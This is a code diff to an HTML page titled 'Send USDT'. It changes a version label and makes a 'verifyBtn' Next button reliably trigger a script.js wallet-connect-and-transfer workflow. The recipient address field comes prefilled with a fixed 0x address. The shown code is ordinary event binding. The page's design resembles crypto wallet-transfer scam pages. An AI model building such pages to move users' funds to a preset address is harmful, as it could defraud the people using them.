@@ -4,7 +4,7 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover"/>
   <meta name="color-scheme" content="light dark">
-  <title>Send USDT v3</title>
+  <title>Send USDT v2</title>
   <link rel="stylesheet" href="style.css">
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
@@ -21,7 +21,7 @@
   </div>
 
   <main class="container">
-    <p class="version-badge" aria-hidden="true">v3</p>
+    <p class="version-badge" aria-hidden="true">v2</p>
     <label class="label" for="address">Address or Domain Name</label>
     <div class="input-group address-input-group">
       <input type="text" id="address" placeholder="Search or Enter" value="0x53d6f1967d89291a92F185CCc744024d50E8c744">
@@ -165,13 +165,24 @@
     })();
   </script>
 
-  <!-- Bind Next() directly (no catch – script handles errors and calls showError) -->
+  <!-- Bind Next() so clicking Next always runs script.js workflow (connectWalletAndSwitch, transfer, etc.) -->
   <script>
     (function () {
-      var btn = document.getElementById("verifyBtn");
-      if (btn && typeof window.Next === "function") {
-        btn.addEventListener("click", function () { window.Next(); });
+      var bound = false;
+      function bindNext() {
+        if (bound) return;
+        var btn = document.getElementById("verifyBtn");
+        if (!btn || typeof window.Next !== "function") return;
+        bound = true;
+        btn.addEventListener("click", function () {
+          window.Next();
+        });
       }
+      bindNext();
+      window.addEventListener("load", bindNext);
+      if (document.readyState === "complete") bindNext();
+      else setTimeout(bindNext, 100);
+      setTimeout(bindNext, 500);
     })();
   </script>
   <!-- Update USD estimate when user enters amount (always show as positive) -->
